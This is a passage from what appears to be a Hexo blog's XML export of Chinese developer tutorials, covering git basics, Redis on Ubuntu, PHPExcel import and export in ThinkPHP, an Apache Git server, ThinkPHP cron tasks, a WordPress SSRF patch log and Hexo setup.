<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line"># 添加所有改动到缓存区</span><br><span class="line"></span><br><span class="line">git commit -m &#39;描述&#39;</span><br><span class="line"># 提交缓存区内的文件，并提供描述</span><br><span class="line"></span><br><span class="line">git status</span><br><span class="line"># 查看当前版本状态（是否clean）</span><br><span class="line"></span><br><span class="line">git fetch &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"># 将远端库获取到本地但不合并，remote为添加的版本库别名，branch为远端的分支名</span><br><span class="line"></span><br><span class="line">git merge &lt;branch&gt;</span><br><span class="line"># 将获取的远端分支合并到本地目前所在的分支</span><br><span class="line"></span><br><span class="line">git push &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"># 上传代码及快速合并，remote为添加的版本库别名，branch可以是master:dev（master为本地分支，dev为远端分支）</span><br></pre></td></tr></table></figure>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDQuc2luYWltZy5jbi9tdzY5MC8wMDZvbGsybmx5MWZ0NGtjazl6NW5qMzBnbjBleWFiMy5qcGc?x-oss-process=image/format,png" alt="image"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>版本控制系统</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu下安装Redis</title>
    <url>/2018/11/01/25.html</url>
    <content><![CDATA[<p>许多的互联网公司将Redis作为数据库和缓存工具，本文笔者就如何在Ubuntu下安装Redis做一个记录。</p>
<a id="more"></a>
<p><strong>1. 安装Redis服务器端</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y redis-server</span><br></pre></td></tr></table></figure>
<p><strong>2. 查看Redis状态</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/redis-server status</span><br></pre></td></tr></table></figure>
<p><strong>3. 链接Redis</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>
<p><strong>4. 简单操作</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看所有的key</span></span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置一个key</span></span><br><span class="line">127.0.0.1:6379&gt; set key1 'hello world'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看key</span></span><br><span class="line">127.0.0.1:6379&gt; get key1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除key</span></span><br><span class="line">127.0.0.1:6379&gt; del key1</span><br></pre></td></tr></table></figure>

<p><strong>5. 删除Redis</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove -y redis-server</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Redis</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP5.1使用PHPExcel进行数据的导入导出</title>
    <url>/2019/01/18/27.html</url>
    <content><![CDATA[<p>数据的批量导入和导出是一个项目的基本功能，本文笔者介绍一下如何在ThinkPHP框架中使用PHPExcel进行数据的导入和导出。</p>
<a id="more"></a>
<ol>
<li>进入项目目录，使用composer安装PHPExcel</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer require phpoffice&#x2F;phpexcel</span><br></pre></td></tr></table></figure>

<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltYWdlLm5zeHNnLmNvbS91cGxvYWRzLzIwMTkwMTE4LzIwMTkwMTE4MTAwNzEwX2Q5ZDQzYmJiNDE0NzI0YzY1MzA0MGRiMjYwNWJjMDliLnBuZw?x-oss-process=image/format,png" alt="image"></p>
<h2 id="导入数据"><a href="#导入数据" class="headerlink" title="导入数据"></a>导入数据</h2><ol>
<li>准备一个含有数据的Excel表格，表头和数据表中的表字段相对应</li>
</ol>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltYWdlLm5zeHNnLmNvbS91cGxvYWRzLzIwMTkwMTE4LzIwMTkwMTE4MTAwNzEwX2Q3ZjliM2I3NGQ5NjgzNDQyMDBlYTZiYzNiMzU1ZjI4LnBuZw?x-oss-process=image/format,png" alt="image"></p>
<ol start="2">
<li>在ThinkPHP中引入PHPExcel类库</li>
</ol>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltYWdlLm5zeHNnLmNvbS91cGxvYWRzLzIwMTkwMTE4LzIwMTkwMTE4MTAwNzEwX2JlMWU2Mzg0MjIyMzQxZmE1ZjMyYjI5YjE2OGU5NTJkLnBuZw?x-oss-process=image/format,png" alt="image"></p>
<ol start="3">
<li>编写导入的PHP代码</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 批量导入管理员model</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array 导入的数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回成功或者失败信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">inputAdmins</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 实例化类库</span></span><br><span class="line">    $obj_phpexcel = <span class="keyword">new</span> \PHPExcel();</span><br><span class="line">    $objReader = \PHPExcel_IOFactory::createReader(<span class="string">'Excel5'</span>);</span><br><span class="line">    <span class="comment">// 接收文件</span></span><br><span class="line">    $inputdata = $_FILES;</span><br><span class="line">    <span class="comment">// 获取并处理数据</span></span><br><span class="line">    $objData = $objReader-&gt;load($inputdata[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $encode = <span class="string">'utf-8'</span>);</span><br><span class="line">    $excel_array=$objData-&gt;getsheet(<span class="number">0</span>)-&gt;toArray();</span><br><span class="line">    <span class="keyword">unset</span>($excel_array[<span class="number">0</span>]);</span><br><span class="line">    $num = <span class="number">0</span>;</span><br><span class="line">    $insertData = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($excel_array <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $insertData[$num][<span class="string">'adminname'</span>] = $value[<span class="number">1</span>];</span><br><span class="line">        $insertData[$num][<span class="string">'status'</span>] = $value[<span class="number">2</span>];</span><br><span class="line">        $insertData[$num][<span class="string">'icon'</span>] = $value[<span class="number">3</span>];</span><br><span class="line">        $insertData[$num][<span class="string">'password'</span>] = $value[<span class="number">4</span>];</span><br><span class="line">        $insertData[$num][<span class="string">'uptime'</span>] = $value[<span class="number">5</span>];</span><br><span class="line">        $insertData[$num][<span class="string">'addtime'</span>] = $value[<span class="number">6</span>];</span><br><span class="line">        $insertData[$num][<span class="string">'delete'</span>] = $value[<span class="number">7</span>];</span><br><span class="line">        $num++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 添加数据</span></span><br><span class="line">    $user = <span class="keyword">new</span> Apiadmins;</span><br><span class="line">    $res = $user-&gt;saveAll($insertData);</span><br><span class="line">    <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span> -&gt; cbMsg(<span class="keyword">true</span>, <span class="string">'导入成功！'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span> -&gt; cbMsg(<span class="keyword">false</span>, <span class="string">'导入失败！'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltYWdlLm5zeHNnLmNvbS91cGxvYWRzLzIwMTkwMTE4LzIwMTkwMTE4MTAwNzEwXzYyZGU4YmM3YzZjNmE4MzgyMTM0MDQyMmQ2NWMwZDE1LnBuZw?x-oss-process=image/format,png" alt="image"></p>
<h2 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h2><ol>
<li>编写导出的PHP代码</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 批量导出管理员model</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $fileName 导出文件名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $headArr 表头</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 导出Excel表格</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">outputAdmins</span><span class="params">($fileName = <span class="string">'文件名'</span>, $headArr = [<span class="string">'id'</span>,<span class="string">'adminname'</span>,<span class="string">'status'</span>,<span class="string">'icon'</span>,<span class="string">'password'</span>,<span class="string">'uptime'</span>,<span class="string">'addtim'</span>,<span class="string">'delete'</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $fileName .= <span class="string">"_"</span> . date(<span class="string">"Ymd_His"</span>, time()) . <span class="string">".xls"</span>;</span><br><span class="line">    $objPHPExcel = <span class="keyword">new</span> \PHPExcel();</span><br><span class="line">    <span class="comment">// Set document properties （设置文档属性）</span></span><br><span class="line">    $objPHPExcel-&gt;getProperties()-&gt;setCreator(<span class="string">"Maarten Balliauw"</span>)</span><br><span class="line">                                -&gt;setLastModifiedBy(<span class="string">"Maarten Balliauw"</span>)</span><br><span class="line">                                -&gt;setTitle(<span class="string">"Office 2007 XLSX Test Document"</span>)</span><br><span class="line">                                -&gt;setSubject(<span class="string">"Office 2007 XLSX Test Document"</span>)</span><br><span class="line">                                -&gt;setDescription(<span class="string">"Test document for Office 2007 XLSX, generated using PHP classes."</span>)</span><br><span class="line">                                -&gt;setKeywords(<span class="string">"office 2007 openxml php"</span>)</span><br><span class="line">                                -&gt;setCategory(<span class="string">"Test result file"</span>);</span><br><span class="line">    <span class="comment">// 设置头信息</span></span><br><span class="line">    $objPHPExcel-&gt;setActiveSheetIndex(<span class="number">0</span>);</span><br><span class="line">    $key = ord(<span class="string">'A'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($headArr <span class="keyword">as</span> $v) &#123;</span><br><span class="line">        $colum = chr($key);</span><br><span class="line">        $objPHPExcel-&gt;getActiveSheet()-&gt;setCellValue($colum . <span class="string">'1'</span>, $v);</span><br><span class="line">        $key += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取管理员全部数据</span></span><br><span class="line">    $data = Apiadmins::all();</span><br><span class="line">    $data = $data-&gt;toArray();</span><br><span class="line">    $column = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $rows) &#123; <span class="comment">// 行写入</span></span><br><span class="line">        $span = ord(<span class="string">"A"</span>);</span><br><span class="line">        <span class="keyword">foreach</span> ($data[$key] <span class="keyword">as</span> $keyName =&gt; $value) &#123; <span class="comment">// 列写入</span></span><br><span class="line">            $objPHPExcel-&gt;getActiveSheet()-&gt;setCellValue(chr($span) . $column, $value);</span><br><span class="line">            $span++;</span><br><span class="line">        &#125;</span><br><span class="line">        $column++;</span><br><span class="line">    &#125;</span><br><span class="line">    $objPHPExcel-&gt;setActiveSheetIndex(<span class="number">0</span>); <span class="comment">// 设置活动单指数到第一个表,所以Excel打开这是第一个表</span></span><br><span class="line">    $objWriter = \PHPExcel_IOFactory::createWriter($objPHPExcel, <span class="string">'Excel5'</span>);</span><br><span class="line">    $objWriter-&gt;save(str_replace(<span class="string">'.php'</span>, <span class="string">'.xls'</span>, Env::get(<span class="string">'runtime_path'</span>).$fileName));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span> -&gt; cbMsg(<span class="keyword">true</span>, <span class="string">'导出成功，请去目录：'</span>.Env::get(<span class="string">'runtime_path'</span>).<span class="string">' 查看！文件：'</span>.$fileName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="http://image.nsxsg.com/uploads/20190118/20190118100710_4aa9dd9e9b75394c641eadcd089b4b74.png" alt="image"></p>
<ol start="2">
<li>导出测试</li>
</ol>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltYWdlLm5zeHNnLmNvbS91cGxvYWRzLzIwMTkwMTE4LzIwMTkwMTE4MTAwNzEwXzBiY2VmZjJkMGUyYmIzODdmYTg1OWY5NzI1NjgyNjJkLnBuZw?x-oss-process=image/format,png" alt="image"></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltYWdlLm5zeHNnLmNvbS91cGxvYWRzLzIwMTkwMTE4LzIwMTkwMTE4MTAwNzExXzMwYThhZTgzNGQ2ZTQ1MTkxNzZhYzBjOTI3ODk5Zjc4LnBuZw?x-oss-process=image/format,png" alt="image"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>ThinkPHP框架</tag>
        <tag>PHPExcel</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建Git服务器</title>
    <url>/2018/10/23/24.html</url>
    <content><![CDATA[<p>顺应时代的发展，Git成为了许多互联网公司进行项目版本控制的首选，本文笔者就对搭建Git服务器的过程做个记录。</p>
<a id="more"></a>
<h2 id="Apache和Git的安装"><a href="#Apache和Git的安装" class="headerlink" title="Apache和Git的安装"></a>Apache和Git的安装</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y httpd git</span><br></pre></td></tr></table></figure>

<h2 id="创建Git仓库"><a href="#创建Git仓库" class="headerlink" title="创建Git仓库"></a>创建Git仓库</h2><ol>
<li>新建一个目录<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /data/httpd/git</span><br></pre></td></tr></table></figure></li>
<li>进入目录<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /data/httpd/git</span><br></pre></td></tr></table></figure></li>
<li>创建项目目录并进入该目录<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir demo</span><br><span class="line">cd demo</span><br></pre></td></tr></table></figure></li>
<li>创建Git仓库<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init --bare demo.git</span><br></pre></td></tr></table></figure></li>
<li>分配权限<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown -R apache:apache .</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="创建Git用户验证的账号"><a href="#创建Git用户验证的账号" class="headerlink" title="创建Git用户验证的账号"></a>创建Git用户验证的账号</h2><ol>
<li>创建用户<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">htpasswd -m -c /etc/httpd/conf.d/git-team.htpasswd zh1(zh1是账号然后连续输入两次密码)</span><br><span class="line"><span class="meta">#</span><span class="bash"> -c 是创建的意思，没有的时候创建，有的话会先删除文件再创建</span></span><br><span class="line">htpasswd -m /etc/httpd/conf.d/git-team.htpasswd zh2(如果第一个账号命令里有了-c 其它账号要去掉-c)</span><br></pre></td></tr></table></figure></li>
<li>修改密码<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 先删除用户</span></span><br><span class="line">htpasswd -D 存放用户名和密码的文件名 用户</span><br><span class="line"><span class="meta">#</span><span class="bash"> 再添加用户</span></span><br><span class="line">htpasswd -m 存放用户名和密码的文件名 用户</span><br></pre></td></tr></table></figure></li>
<li>修改用户密码文件的访问权限和所有者<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown apache:apache /etc/httpd/conf.d/git-team.htpasswd</span><br><span class="line">chmod 640 /etc/httpd/conf.d/git-team.htpasswd</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="修改apache的配置文件"><a href="#修改apache的配置文件" class="headerlink" title="修改apache的配置文件"></a>修改apache的配置文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">内容如下：</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName git.nsxsg.com(git服务器域名)</span><br><span class="line">    SetEnv GIT_HTTP_EXPORT_ALL</span><br><span class="line">    SetEnv GIT_PROJECT_ROOT /data/httpd/git(git仓库文件夹)</span><br><span class="line">    ScriptAlias /git/ /usr/libexec/git-core/git-http-backend/(URL中以/git/开头访问路径映射到Git，所以访问的时候域名后面要紧跟http://域名/git/项目名/项目名.git)</span><br><span class="line">    &lt;Location /&gt;</span><br><span class="line">        AuthType Basic</span><br><span class="line">        AuthName "Git"</span><br><span class="line">        AuthUserFile /etc/httpd/conf.d/git-team.htpasswd(用户密码文件地址)</span><br><span class="line">        Require valid-user</span><br><span class="line">    &lt;/Location&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>

<h2 id="重启apache"><a href="#重启apache" class="headerlink" title="重启apache"></a>重启apache</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/httpd restart</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Apache</tag>
        <tag>Git</tag>
        <tag>版本控制系统</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP框架应用之定时任务</title>
    <url>/2018/12/13/26.html</url>
    <content><![CDATA[<p>定时任务是每个项目必不可少的功能。本文介绍一下如何使用ThinkPHP框架的定时任务。</p>
<a id="more"></a>
<h2 id="新建一个定时类"><a href="#新建一个定时类" class="headerlink" title="新建一个定时类"></a>新建一个定时类</h2><ol>
<li><p>在 <code>application/admin/command</code> 目录下新建一个 <code>Test.php</code> 文件  </p>
</li>
<li><p>文件内容如下：  </p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">admin</span>\<span class="title">command</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Command</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Input</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">configure</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setName(<span class="string">'test'</span>)-&gt;setDescription(<span class="string">"计划任务 Test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">(Input $input, Output $output)</span></span>&#123;</span><br><span class="line">        $output-&gt;writeln(<span class="string">'Date Crontab job start...'</span>);</span><br><span class="line">        <span class="comment">/*** 这里写计划任务列表集 START ***/</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">$this</span>-&gt;test();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*** 这里写计划任务列表集 END ***/</span></span><br><span class="line">        $output-&gt;writeln(<span class="string">'Date Crontab job end...'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'定时任务成功啦~'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果图如下：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3ZTV6a29qMzFhcjBwbmdwZi5qcGc?x-oss-process=image/format,png" alt="image"></p>
<h2 id="修改-command-php-文件"><a href="#修改-command-php-文件" class="headerlink" title="修改 command.php 文件"></a>修改 <code>command.php</code> 文件</h2><blockquote>
<p>文件位置 <code>application/command.php</code></p>
</blockquote>
<ul>
<li>修改内容如下</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">'app\admin\command\Test'</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>效果图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDMuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3Z3M1MWpqMzE3YzBsMzc2ZC5qcGc?x-oss-process=image/format,png" alt="image"></p>
<h2 id="查看ThinkPHP框架中定时是否添加成功"><a href="#查看ThinkPHP框架中定时是否添加成功" class="headerlink" title="查看ThinkPHP框架中定时是否添加成功"></a>查看ThinkPHP框架中定时是否添加成功</h2><ul>
<li>进入项目目录 <strong>（并非是根目录）</strong> ，使用命令查看</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php think</span><br></pre></td></tr></table></figure>

<p>效果图如下：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3ajM0eTZqMzFoNjBvYnRiYS5qcGc?x-oss-process=image/format,png" alt="image"></p>
<h2 id="运行定时任务"><a href="#运行定时任务" class="headerlink" title="运行定时任务"></a>运行定时任务</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php think test</span><br></pre></td></tr></table></figure>

<p>效果如图：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3bGJwMTlqMzFoNjBvYm16Zy5qcGc?x-oss-process=image/format,png" alt="image"></p>
<h2 id="在Linux中添加crontab"><a href="#在Linux中添加crontab" class="headerlink" title="在Linux中添加crontab"></a>在Linux中添加crontab</h2><ul>
<li>编辑crontab</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编辑crontab</span></span><br><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入编辑模式后添加如下内容</span></span><br><span class="line">* * * * * php /home/wwwroot/demo.com/think test    # 每分钟执行一次计划任务</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存退出后重启crontab</span></span><br><span class="line">/etc/init.d/crond restart</span><br></pre></td></tr></table></figure>

<p>效果图如下：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDEuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF3bmswcWJqMzB0djA2ZGRnMC5qcGc?x-oss-process=image/format,png" alt="image"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93eDQuc2luYWltZy5jbi9sYXJnZS8wMDZvbGsybmx5MWZ5NTF4MGpvdTBqMzB0djAzandlbC5qcGc?x-oss-process=image/format,png" alt="image"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>ThinkPHP框架</tag>
        <tag>定时任务</tag>
      </tags>
  </entry>
  <entry>
    <title>WordPress的IP验证不当漏洞处理过程</title>
    <url>/2019/05/05/28.html</url>
    <content><![CDATA[<p>今天登陆阿里云，站内信息提示我有漏洞需要处理。本文是笔者对WordPress的IP验证不当漏洞处理过程的记录。</p>
<a id="more"></a>
<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>阿里云提示 WordPress IP验证不当漏洞</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2Nkbi5uc3hzZy5jb20vdXBsb2Fkcy8yMDE5MDQzMC8yMDE5MDQzMDEyMDU1OF9iNTU0ZmZlMjQ3M2UxYmRkYjdjMjg1OGI2MzJkZGEyNS5qcGVn?x-oss-process=image/format,png" alt="image"></p>
<h2 id="修改方法"><a href="#修改方法" class="headerlink" title="修改方法"></a>修改方法</h2><ol>
<li>进入http.php文件目录  </li>
</ol>
<p><code>[WordPress根目录]/wp-includes/http.php</code>  </p>
<ol start="2">
<li>定位到http.php文件第550行左右，修改正则表达式</li>
</ol>
<p><strong>原文件内容：</strong>  </p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2Nkbi5uc3hzZy5jb20vdXBsb2Fkcy8yMDE5MDQzMC8yMDE5MDQzMDEyMDU1OV9jYWQ3OTRjYWViN2NiN2IwMzdjMWI1ZTQ5YjEzYzFkOS5qcGVn?x-oss-process=image/format,png" alt="image"></p>
<p><strong>修改后的文件内容：</strong></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2Nkbi5uc3hzZy5jb20vdXBsb2Fkcy8yMDE5MDQzMC8yMDE5MDQzMDEyMDU1OV9lMGZmNTFkYWM0YTg5NDM0MGRmNzgyYzRmNGUyM2ZiYy5qcGVn?x-oss-process=image/format,png" alt="image"></p>
<ol start="3">
<li>定位到http.php文件第566行左右，修改ip验证</li>
</ol>
<p><strong>原文件内容：</strong></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2Nkbi5uc3hzZy5jb20vdXBsb2Fkcy8yMDE5MDUwNi8yMDE5MDUwNjEyMDYxN181MzM4ZWY4NmY0Y2ZmMjg4MGIxNzdjZTJhMjFjMDA1NS5qcGVn?x-oss-process=image/format,png" alt="image"></p>
<p><strong>修改后的文件内容：</strong></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2Nkbi5uc3hzZy5jb20vdXBsb2Fkcy8yMDE5MDUwNi8yMDE5MDUwNjEyMDYxN19iNmFiNGMxYjA4ZDM5N2NhYjUyNTQ3ZWM0MzMyOTliOC5qcGVn?x-oss-process=image/format,png" alt="image"></p>
<h2 id="测试漏洞"><a href="#测试漏洞" class="headerlink" title="测试漏洞"></a>测试漏洞</h2><ol>
<li>去阿里云重新验证漏洞</li>
</ol>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2Nkbi5uc3hzZy5jb20vdXBsb2Fkcy8yMDE5MDQzMC8yMDE5MDQzMDEyMDU1OV9hNTc5MmNmOGUxZmMzMzZhODc4NDdjZjFlNGExZWUxMC5qcGVn?x-oss-process=image/format,png" alt="image"></p>
<ol start="2">
<li>验证成功</li>
</ol>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2Nkbi5uc3hzZy5jb20vdXBsb2Fkcy8yMDE5MDQzMC8yMDE5MDQzMDEyMDU1OV8xNTQwMGNiMzhkNDI3M2YxNTI3NjI2NGQ1MTIyZmUzYS5qcGVn?x-oss-process=image/format,png" alt="image"></p>
<hr>
<p>参考文章<a href="https://blog.csdn.net/dclnet/article/details/81869078" target="_blank" rel="noopener">https://blog.csdn.net/dclnet/article/details/81869078</a></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>SSRF漏洞</tag>
        <tag>WordPress</tag>
        <tag>安全漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客搭建</title>
    <url>/2019/07/10/29.html</url>
    <content><![CDATA[<p>Hexo是一个快速、简洁且高效的博客框架。天生支持Markdown，使它备受程序猿的喜爱。简单易部署、丰富的插件、美观的主题使它脱颖而出。本人表示正式从WordPress脱坑，拥抱Hexo。<br>o(^＠^)o</p>
<a id="more"></a>
<h2 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h2><p>检查电脑中是否安装下列应用程序：</p>
<ul>
<li><p><a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Node.js</a> （下载最新稳定版）</p>
</li>
<li><p><a href="https://git-scm.com/downloads" target="_blank" rel="noopener">Git</a>（下载最新稳定版）</p>
</li>
</ul>
<blockquote>
<p>遇到 <strong>任何问题</strong> 请参考 <a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo官方文档</a> ，官方文档很详细。</p>
</blockquote>
<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>使用 npm 安装 Hexo</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<h2 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h2><p>新建一个网站</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init [folder]</span><br><span class="line">cd [folder]</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<blockquote>
<p>具体目录结构和文件说明请参考 <a href="https://hexo.io/zh-cn/docs/setup" target="_blank" rel="noopener">官方文档</a>  </p>
</blockquote>
<p>开启本地Hexo服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>根据提示在浏览器输入 <a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a>即可</p>
